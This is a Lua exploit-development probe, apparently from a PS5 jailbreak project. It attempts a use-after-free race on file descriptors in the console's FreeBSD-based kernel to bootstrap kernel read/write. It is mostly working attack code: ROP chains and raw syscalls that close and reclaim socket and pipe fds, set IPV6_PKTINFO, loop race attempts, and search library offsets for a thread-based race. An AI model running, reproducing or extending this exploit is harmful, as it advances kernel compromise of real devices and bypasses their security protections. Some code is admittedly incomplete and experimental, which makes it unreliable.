-- CRASH_CLASS: MODERATE
-- PROBE 128b: Pipe UAF race for kernel R/W bootstrap
--
-- The PS5 kernel exploit typically uses a race between close() and
-- read/write on a pipe or socket. On FreeBSD, the file descriptor
-- table lookup and the actual operation are not atomic, creating a
-- TOCTOU window.
--
-- Strategy: Create many pipe pairs. In a tight loop:
-- 1. Main ropchain: close(pipe_rd) then immediately open new socket
--    (reclaiming the fd number)
-- 2. Second ropchain: read/setsockopt on the OLD fd number
-- 3. If timing is right, the second operation hits the new object
--
-- This probe tests if we can actually reclaim fds and if the
-- native.fcall_with_rax path works for arbitrary syscalls.

print("=== PROBE 128b: PIPE UAF RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

-- Section A: Test native.fcall_with_rax for syscalls
print("--- SECTION A: NATIVE.FCALL_WITH_RAX ---")

local has_native_fcall = false
if native and native.fcall_with_rax then
    print("native.fcall_with_rax: AVAILABLE")
    has_native_fcall = true

    -- Test getpid via native.fcall_with_rax
    local stub = syscall.pipe.fn_addr  -- generic "syscall;ret" in libkernel
    local gpid = native.fcall_with_rax(stub, 20)  -- SYS_getpid=20
    print("getpid via native.fcall_with_rax = " .. tostring(gpid))
    print("getpid via syscall.getpid = " .. pid)

    -- Test socket creation
    local sock = native.fcall_with_rax(stub, 97, 28, 2, 17)  -- socket(AF_INET6, SOCK_DGRAM, UDP)
    print("socket via native = " .. tostring(sock))
    if to_num(sock) >= 0 then
        -- Close it
        local cr = native.fcall_with_rax(stub, 6, to_num(sock))  -- close
        print("close via native = " .. tostring(cr))
    end
else
    print("native.fcall_with_rax: NOT AVAILABLE")
    -- Check what's in native
    if native then
        for k, v in pairs(native) do
            print("  native." .. tostring(k) .. " = " .. type(v))
        end
    else
        print("  native is nil")
    end
end

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- Section B: FD reclamation test
-- Close an fd and immediately open a new one - does it get the same number?
print("")
print("--- SECTION B: FD RECLAMATION ---")

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_UDP = 17
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46

local sc_close = make_sc(6)
local sc_socket = make_sc(97)

-- Create a pipe
local rd, wr = create_pipe()
print("pipe: rd=" .. rd .. " wr=" .. wr)

-- Close rd
local chain1 = ropchain:new()
chain1:push_syscall_with_ret(sc_close, rd)
chain1:restore_through_longjmp()
chain1:execute_through_coroutine()
print("close(rd=" .. rd .. ") ret=" .. to_num(memory.read_qword(chain1:get_last_retval_addr())))

-- Immediately open socket - should get fd=rd
local chain2 = ropchain:new()
chain2:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
chain2:restore_through_longjmp()
chain2:execute_through_coroutine()
local new_fd = to_num(memory.read_qword(chain2:get_last_retval_addr()))
print("new socket fd=" .. new_fd .. " (was rd=" .. rd .. ")")
if new_fd == rd then
    print("*** FD RECLAIMED! Same number ***")
end

-- Cleanup
local chain3 = ropchain:new()
chain3:push_syscall_with_ret(sc_close, new_fd)
chain3:push_syscall_with_ret(sc_close, wr)
chain3:restore_through_longjmp()
chain3:execute_through_coroutine()

print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- Section C: Multi-operation ropchain (close + socket + setsockopt in one chain)
-- This is the key: a single ropchain that does close+reclaim+operate atomically
print("")
print("--- SECTION C: MULTI-OP ROPCHAIN ---")

local sc_setsockopt = make_sc(105)

-- Create target: pipe + ipv6 socket
local pipe_rd2, pipe_wr2 = create_pipe()
local chain_s = ropchain:new()
chain_s:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
chain_s:restore_through_longjmp()
chain_s:execute_through_coroutine()
local target_sock = to_num(memory.read_qword(chain_s:get_last_retval_addr()))
print("target_sock=" .. target_sock .. " pipe_rd=" .. pipe_rd2)

-- Set pktinfo on target socket
local pktinfo = memory.alloc(0x20)
memory.write_qword(pktinfo, 0)
memory.write_qword(pktinfo + 8, 0)
memory.write_dword(pktinfo + 16, 0)

local chain_sso = ropchain:new()
chain_sso:push_syscall_with_ret(sc_setsockopt, target_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14)
chain_sso:restore_through_longjmp()
chain_sso:execute_through_coroutine()
print("setsockopt(pktinfo) ret=" .. to_num(memory.read_qword(chain_sso:get_last_retval_addr())))

-- Now test: single ropchain that does close(target_sock) + socket(AF_INET6) + setsockopt(new, PKTINFO)
-- This tests if we can chain 3 syscalls in one ropchain
local chain_multi = ropchain:new()
chain_multi:push_syscall_with_ret(sc_close, target_sock)
chain_multi:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
chain_multi:push_syscall_with_ret(sc_setsockopt, target_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14)
chain_multi:restore_through_longjmp()
chain_multi:execute_through_coroutine()

-- Read results (each push_syscall_with_ret stores at a different retval addr)
-- Actually, get_last_retval_addr only gives the LAST one
-- We need to check how to get intermediate return values

-- Let's try a different approach: check what retval addrs we have
print("retval_count: " .. tostring(chain_multi.retval_count or "nil"))
print("last_retval: " .. to_num(memory.read_qword(chain_multi:get_last_retval_addr())))

-- The setsockopt should return 0 if fd was reclaimed (new socket got target_sock's number)
-- or -1 if fd wasn't reclaimed

print("canary3: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- Section D: Test with native.fcall_with_rax (much faster per-call)
print("")
print("--- SECTION D: FAST RACE LOOP ---")

if has_native_fcall then
    local stub = syscall.pipe.fn_addr
    local ATTEMPTS = 100
    local hits = 0

    for i = 1, ATTEMPTS do
        -- Create ipv6 socket
        local s = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
        if s < 0 then
            print("socket failed at iter " .. i)
            break
        end

        -- Set IPV6_PKTINFO
        memory.write_qword(pktinfo, 0)
        memory.write_qword(pktinfo + 8, 0)
        memory.write_dword(pktinfo + 16, 0)
        native.fcall_with_rax(stub, 105, s, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14)

        -- Close socket
        native.fcall_with_rax(stub, 6, s)

        -- Immediately try to reclaim with a pipe
        local pipe_buf = memory.alloc(8)
        memory.write_dword(pipe_buf, 0)
        memory.write_dword(pipe_buf + 4, 0)
        native.fcall_with_rax(stub, 42, to_num(pipe_buf))  -- pipe(2)=42... but it needs fildes[2]

        -- Read pipe fds
        local fd0 = to_num(memory.read_dword(pipe_buf))
        local fd1 = to_num(memory.read_dword(pipe_buf + 4))

        -- Try setsockopt on old fd 's' - if pipe reclaimed it, this hits the pipe
        local sso_ret = to_num(native.fcall_with_rax(stub, 105, s, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))

        if sso_ret == 0 then
            hits = hits + 1
            if hits <= 3 then
                print(string.format("  iter %d: sock=%d, pipe=(%d,%d), setsockopt(old=%d)=0 HIT!", i, s, fd0, fd1, s))
            end
        end

        -- Cleanup
        if fd0 > 0 then native.fcall_with_rax(stub, 6, fd0) end
        if fd1 > 0 then native.fcall_with_rax(stub, 6, fd1) end

        -- Health check every 25 iterations
        if i % 25 == 0 then
            if not pcall(function() return to_num(syscall.getpid()) end) then
                print("CRASHED at iter " .. i)
                break
            end
        end
    end

    print(string.format("Race results: %d/%d setsockopt hits on reclaimed fd", hits, ATTEMPTS))
else
    print("SKIPPED: native.fcall_with_rax not available")
    -- Fallback: use ropchain for each operation
    print("Using ropchain fallback (slower)...")

    local ATTEMPTS = 10
    for i = 1, ATTEMPTS do
        -- Create socket
        local c1 = ropchain:new()
        c1:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
        c1:restore_through_longjmp()
        c1:execute_through_coroutine()
        local s = to_num(memory.read_qword(c1:get_last_retval_addr()))

        if s < 0 then break end

        -- Set pktinfo + close + reclaim in one chain
        local c2 = ropchain:new()
        c2:push_syscall_with_ret(sc_setsockopt, s, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14)
        c2:push_syscall_with_ret(sc_close, s)
        c2:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
        c2:restore_through_longjmp()
        c2:execute_through_coroutine()

        local new_s = to_num(memory.read_qword(c2:get_last_retval_addr()))
        print(string.format("  iter %d: old=%d new=%d reclaimed=%s", i, s, new_s, tostring(new_s == s)))

        -- Cleanup
        local c3 = ropchain:new()
        c3:push_syscall_with_ret(sc_close, new_s)
        c3:restore_through_longjmp()
        c3:execute_through_coroutine()
    end
end

-- Section E: Thread race (if threads work)
print("")
print("--- SECTION E: THREAD RACE ---")
-- Create thread blocked on mutex, main thread preps the target
-- Then unlock and immediately race

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local mtx_init_fn = fcall(libc_addrofs.Mtx_init)
local mtx_lock_fn = fcall(libc_addrofs.Mtx_lock)
local mtx_unlock_fn = fcall(libc_addrofs.Mtx_unlock)

-- Thread can only call one function: Mtx_lock(mutex)
-- When unlocked, the thread wakes and immediately returns from Mtx_lock
-- Thread's next action: returns to Thrd_create cleanup → thread exits
-- This gives us a "signal" but not useful execution in the thread

-- What we CAN do: thread calls close() on a fd!
-- We need a close function. Check if libc has one.
print("Looking for close in libc_addrofs...")
for k, v in pairs(libc_addrofs) do
    local ks = tostring(k):lower()
    if ks:find("close") or ks:find("shut") then
        print("  " .. tostring(k) .. " = " .. tostring(v))
    end
end

-- Check eboot for close
for k, v in pairs(eboot_addrofs) do
    local ks = tostring(k):lower()
    if ks:find("close") then
        print("  eboot." .. tostring(k) .. " = " .. tostring(v))
    end
end

-- If we find sceKernelClose in libc, that's our close() wrapper
-- It takes (int fd) and returns int — perfect for Thrd_create

print("canary4: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 128b COMPLETE ===")
